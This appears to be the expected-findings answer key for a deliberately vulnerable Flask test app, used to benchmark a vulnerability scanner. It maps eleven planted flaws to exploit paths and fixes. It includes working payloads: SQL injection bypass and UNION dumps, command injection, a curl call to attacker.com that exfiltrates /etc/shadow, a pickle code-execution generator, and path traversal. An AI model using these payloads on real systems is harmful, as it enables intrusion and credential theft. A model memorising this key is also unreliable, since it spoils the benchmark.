# Expected Findings — Spoiler Sheet

This document maps every intentional vulnerability in `target-app/` to the
VulnHunter finding format. Use it to verify that a scan produced the expected
results, or to benchmark detection accuracy.

---

## VULN-001 · SQL Injection — Authentication Bypass

| Field | Value |
|-------|-------|
| **File** | `auth.py` |
| **Line** | `~50` (`login()`) |
| **Entry point** | `POST /auth/login` → `request.form["username"]` |
| **Sink** | `db.execute(f"SELECT * FROM users WHERE username = '{username}' ...")` |
| **Hunt class** | Injection |
| **Severity** | Critical |

**Exploit path:**
1. Attacker sends `username = ' OR '1'='1' --` and any password.
2. The injected SQL evaluates to `WHERE '1'='1'`, returning the first user row (admin).
3. Session is established as admin without knowing any password.

**Proof of concept:**
```
POST /auth/login
username=' OR '1'='1' --&password=anything
```

**Fix strategy:** Replace f-string query with a parameterized query:
```python
user = db.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, hashed)
).fetchone()
```

---

## VULN-002 · SQL Injection — Report Date Filter (UNION data exfiltration)

| Field | Value |
|-------|-------|
| **File** | `reports.py` |
| **Line** | `~55` (`export()`) |
| **Entry point** | `GET /reports/export?from_date=...&to_date=...` |
| **Sink** | `db.execute(f"... AND created >= '{from_date}' ...")` |
| **Hunt class** | Injection |
| **Severity** | Critical |

**Exploit path:**
1. Authenticated attacker navigates to `/reports/export?fmt=csv&from_date=' UNION SELECT id,username,password FROM users--&to_date=x`.
2. The UNION appends every row from the `users` table (including hashed passwords) to the CSV output.

**Fix strategy:** Parameterized query for both date bounds.

---

## VULN-003 · SQL Injection — Audit Log Search

| Field | Value |
|-------|-------|
| **File** | `admin.py` |
| **Line** | `~94` (`audit_log()`) |
| **Entry point** | `GET /admin/audit?q=...` |
| **Sink** | `db.execute(f"... WHERE action LIKE '%{q}%' ...")` |
| **Hunt class** | Injection |
| **Severity** | High |

**Exploit path:** Admin (or attacker who forged an admin session via the hardcoded secret key) injects SQL through the `q` search parameter to read or drop arbitrary tables.

---

## VULN-004 · Command Injection — Ping Diagnostic

| Field | Value |
|-------|-------|
| **File** | `admin.py` |
| **Line** | `~79` (`ping()`) |
| **Entry point** | `POST /admin/ping` → `request.form["host"]` |
| **Sink** | `subprocess.run(f"ping -c 2 {host}", shell=True, ...)` |
| **Hunt class** | Injection |
| **Severity** | Critical |

**Exploit path:**
1. Admin posts `host = 127.0.0.1; id > /tmp/pwned`.
2. Shell splits on `;` and executes both `ping` and the injected command as the web server's OS user.

**Fix strategy:** Pass arguments as a list and remove `shell=True`:
```python
import shlex
result = subprocess.run(["ping", "-c", "2", host], capture_output=True, text=True, timeout=10)
```

---

## VULN-005 · Command Injection — PDF Export via Forged Session

| Field | Value |
|-------|-------|
| **File** | `reports.py` |
| **Line** | `~77` (`export()`) |
| **Entry point** | `session["username"]` (attacker-controlled after forging session cookie) |
| **Sink** | `subprocess.run(f"wkhtmltopdf {tmp_path} {out_path}", shell=True, ...)` |
| **Hunt class** | Injection |
| **Severity** | Critical |

**Exploit path:**
1. Attacker knows the hardcoded `app.secret_key = "super-secret-dev-key-1234"` (VULN-008).
2. Attacker crafts a Flask session cookie with `username = "x; curl http://attacker.com/$(cat /etc/shadow) #"`.
3. On `GET /reports/export?fmt=pdf`, the injected username is interpolated into the shell command, exfiltrating `/etc/shadow`.

---

## VULN-006 · Insecure Deserialization — Pickle Restore

| Field | Value |
|-------|-------|
| **File** | `files.py` |
| **Line** | `~95` (`restore()`) |
| **Entry point** | `POST /files/restore` → `request.form["data"]` |
| **Sink** | `pickle.loads(base64.b64decode(raw))` |
| **Hunt class** | Logic & Crypto |
| **Severity** | Critical |

**Exploit path:**
1. Attacker generates a malicious pickle payload that executes `os.system("id")` on `__reduce__`.
2. Sends it base64-encoded to `/files/restore`.
3. `pickle.loads` deserializes it, triggering arbitrary OS command execution.

**Proof of concept payload generator:**
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

**Fix strategy:** Replace pickle with a safe format (JSON) and validate fields explicitly. Never deserialize untrusted data with pickle.

---

## VULN-007 · Path Traversal — File Preview

| Field | Value |
|-------|-------|
| **File** | `files.py` |
| **Line** | `~76` (`preview()`) |
| **Entry point** | `GET /files/preview/<doc_id>` (path stored from upload filename) |
| **Sink** | `open(doc["path"], "r")` |
| **Hunt class** | Navigation & Access |
| **Severity** | High |

**Exploit path:**
1. Attacker uploads a file with filename `../../etc/passwd` (or submits it via a crafted multipart request that bypasses browser restrictions).
2. The path is stored as-is in the database.
3. Visiting `/files/preview/<id>` reads and displays the traversed file.

**Fix strategy:** Normalize and jail all stored paths to `UPLOAD_DIR` using `os.path.realpath` at upload time; reject paths that escape the upload directory.

---

## VULN-008 · Hardcoded Secret Key

| Field | Value |
|-------|-------|
| **File** | `app.py` |
| **Line** | `~17` |
| **Entry point** | Source code / version control |
| **Sink** | `app.secret_key = "super-secret-dev-key-1234"` |
| **Hunt class** | Logic & Crypto |
| **Severity** | High |

**Impact:** Any attacker who can read this source (leaked repo, insider, disclosed code) can forge valid Flask session cookies, impersonating any user including admin. This is the root cause that makes VULN-005 exploitable by an unauthenticated attacker.

**Fix strategy:** Load the secret from an environment variable or a secrets manager; fail startup if it is absent or matches known defaults.

---

## VULN-009 · Broken Object-Level Authorization — Document Download

| Field | Value |
|-------|-------|
| **File** | `files.py` |
| **Line** | `~60` (`download()`) |
| **Entry point** | `GET /files/download/<doc_id>` |
| **Sink** | `db.execute("SELECT * FROM documents WHERE id = ?", (doc_id,))` |
| **Hunt class** | Navigation & Access |
| **Severity** | High |

**Exploit path:** Authenticated employee increments the integer `doc_id` in the URL to download documents belonging to other users (including admin-uploaded files).

**Fix strategy:** Add `AND owner_id = ?` to the query, passing `session["user_id"]`.

---

## VULN-010 · Weak Password Hashing (MD5)

| Field | Value |
|-------|-------|
| **File** | `auth.py` |
| **Line** | `~24` (`_hash_password()`) |
| **Entry point** | `POST /auth/login`, `POST /auth/register` |
| **Sink** | `hashlib.md5(pw.encode()).hexdigest()` |
| **Hunt class** | Logic & Crypto |
| **Severity** | Medium |

**Impact:** MD5 hashes are crackable in seconds on modern hardware using rainbow tables or GPU-accelerated cracking (e.g., Hashcat). The seed database stores MD5 hashes for all accounts.

**Fix strategy:** Use `bcrypt`, `argon2-cffi`, or `hashlib.scrypt` with a random per-user salt.

---

## VULN-011 · Predictable Password Reset Token

| Field | Value |
|-------|-------|
| **File** | `auth.py` |
| **Lines** | `~89–96` (`forgot()`) |
| **Entry point** | `POST /auth/forgot` |
| **Sink** | `token = hashlib.md5(f"{user_id}:{int(time.time())}".encode()).hexdigest()` |
| **Hunt class** | Logic & Crypto |
| **Severity** | High |

**Exploit path:**
1. Attacker requests a password reset for a target account.
2. Token is MD5 of `user_id:epoch_seconds` — both values are knowable within a ~60-second window.
3. Attacker brute-forces the token space (3,600 candidates per hour) and finds the valid one, resetting the victim's password.

**Fix strategy:** Use `secrets.token_urlsafe(32)`, store it with an expiry timestamp, and never derive it from predictable inputs.

---

## Summary Table

| ID | Vulnerability | File | Severity | Hunt Class |
|----|--------------|------|----------|------------|
| VULN-001 | SQL Injection — Auth bypass | auth.py | Critical | Injection |
| VULN-002 | SQL Injection — Report UNION | reports.py | Critical | Injection |
| VULN-003 | SQL Injection — Audit search | admin.py | High | Injection |
| VULN-004 | Command Injection — Ping | admin.py | Critical | Injection |
| VULN-005 | Command Injection — PDF export | reports.py | Critical | Injection |
| VULN-006 | Insecure Deserialization (pickle) | files.py | Critical | Logic & Crypto |
| VULN-007 | Path Traversal — Preview | files.py | High | Navigation & Access |
| VULN-008 | Hardcoded Secret Key | app.py | High | Logic & Crypto |
| VULN-009 | Broken Object-Level Authorization | files.py | High | Navigation & Access |
| VULN-010 | Weak Password Hashing (MD5) | auth.py | Medium | Logic & Crypto |
| VULN-011 | Predictable Reset Token | auth.py | High | Logic & Crypto |
